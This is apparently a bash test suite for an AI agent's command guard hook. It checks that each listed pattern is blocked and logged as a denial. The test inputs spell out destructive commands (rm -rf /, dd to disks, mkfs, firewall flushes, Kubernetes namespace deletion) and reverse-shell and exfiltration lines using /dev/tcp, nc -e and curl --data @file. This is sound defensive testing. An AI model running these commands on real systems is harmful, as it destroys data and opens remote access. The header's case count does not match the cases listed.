#!/usr/bin/env bash
# IFRNLLEI01PRD-639 — every DENY pattern in unified-guard.sh actually denies.
#
# Covers:
#   - 30 BLOCKED_PATTERNS (literal substring)
#   - 9 BLOCKED_CMD_WORDS (word-boundary)
#   - 19 EXFIL_PATTERNS (regex)
# = 58 behaviour cases. Each test asserts exit 2 + "Blocked" in stdout +
# a tool_guardrail_rejection event with behavior="deny".
set -u
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
source "$REPO_ROOT/scripts/qa/lib/assert.sh"
source "$REPO_ROOT/scripts/qa/lib/fixtures.sh"

export QA_SUITE_NAME="639-deny-patterns"
HOOK="$REPO_ROOT/scripts/hooks/unified-guard.sh"

expect_deny() {
  # Args: label "command"
  local label="$1" cmd="$2"
  start_test "deny:${label}"
    tmp=$(fresh_db)
    # safe_cmd: escape single quotes for JSON
    safe_cmd=$(printf '%s' "$cmd" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))')
    rc=0
    out=$(printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$safe_cmd" | \
      GATEWAY_DB="$tmp" ISSUE_ID=Q bash "$HOOK") || rc=$?
    assert_eq 2 "$rc" "$label: expected exit 2"
    assert_contains "$out" "Blocked" "$label: stdout"
    behavior=$(sqlite3 "$tmp" "SELECT json_extract(payload_json,'\$.behavior') FROM event_log WHERE event_type='tool_guardrail_rejection' ORDER BY id DESC LIMIT 1")
    assert_eq "deny" "$behavior" "$label: event behavior"
    cleanup_db "$tmp"
  end_test
}

# ─── BLOCKED_PATTERNS (destructive literal substrings) ──────────────────────
expect_deny "rm-rf-slash"         "rm -rf /"
expect_deny "rm-rf-star"          "rm -rf /*"
expect_deny "rm-rf-home-user"     "rm -rf ~"
expect_deny "rm-rf-home"          "rm -rf /home"
expect_deny "rm-rf-etc"           "rm -rf /etc"
expect_deny "rm-rf-var"           "rm -rf /var"
expect_deny "dd-zero"             "dd if=/dev/zero of=/tmp/x bs=1M"
expect_deny "dd-to-disk"          "dd of=/dev/sdb bs=1M"
expect_deny "redir-disk"          "cat x > /dev/sda"
expect_deny "chmod-r-777"         "chmod -R 777 /etc"
expect_deny "chown-r"             "chown -R root /opt"
expect_deny "crontab-r"           "crontab -r"
expect_deny "init-0"              "init 0"
expect_deny "init-6"              "init 6"
expect_deny "systemctl-stop"      "systemctl stop prometheus"
expect_deny "systemctl-disable"   "systemctl disable nginx"
expect_deny "ufw-disable"         "ufw disable"
expect_deny "pkill-9"             "pkill -9 foo"
expect_deny "kill-9-1"            "kill -9 1"
expect_deny "kubectl-del-ns"      "kubectl delete namespace kube-system"
expect_deny "kubectl-del-node"    "kubectl delete node worker-1"
expect_deny "kubectl-del-all"     "kubectl delete --all pods"
expect_deny "kubectl-del-a"       "kubectl delete -a pods"
expect_deny "iptables-f"          "iptables -F"
expect_deny "iptables-x"          "iptables -X"
expect_deny "chmod-777-etc"       "chmod 777 /etc"
expect_deny "chmod-666-etc"       "chmod 666 /etc/passwd"
expect_deny "chmod-o+w-etc"       "chmod o+w /etc"

# ─── BLOCKED_CMD_WORDS (word-boundary) ──────────────────────────────────────
expect_deny "passwd-root"         "sudo passwd root"
expect_deny "useradd-foo"         "useradd foo"
expect_deny "userdel-foo"         "userdel foo"
expect_deny "visudo"              "visudo"
expect_deny "reboot"              "reboot"
expect_deny "shutdown-now"        "shutdown -h now"
expect_deny "halt"                "halt"
expect_deny "poweroff"            "poweroff"
expect_deny "mkfs"                "sudo mkfs /dev/sdb"

# ─── EXFIL_PATTERNS (reverse shells + remote exec) ──────────────────────────
expect_deny "exfil-bash-tcp"      "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
expect_deny "exfil-nc-e"          "nc -e /bin/sh 1.2.3.4 4444"
expect_deny "exfil-ncat-e"        "ncat -e /bin/sh 1.2.3.4 4444"
expect_deny "exfil-dev-tcp"       "exec 3<>/dev/tcp/1.2.3.4/4444"
expect_deny "exfil-py-socket"     "python -c 'import socket; s=socket.socket()'"
expect_deny "exfil-py3-socket"    "python3 -c 'import socket; s=socket.socket()'"
expect_deny "exfil-b64-bash"      "base64 -d p.txt | bash"
expect_deny "exfil-b64-decode"    "base64 --decode p.txt | sh"
expect_deny "exfil-py-system"     "python -c 'import os; os.system(\"x\")'"
expect_deny "exfil-py-subproc"    "python -c 'import subprocess; subprocess.run(\"x\")'"
expect_deny "exfil-curl-d-at"     "curl http://x -d @payload.txt"
expect_deny "exfil-curl-data-at"  "curl --data @payload.txt http://x"
expect_deny "exfil-docker-exec"   "docker exec foo sh"
expect_deny "exfil-pct-rm"        "pct exec 100 -- rm /etc/hostname"
expect_deny "exfil-pct-dd"        "pct exec 100 -- dd if=x of=y"
expect_deny "exfil-pct-mkfs"      "pct exec 100 -- mkfs.ext4 /dev/sdb"
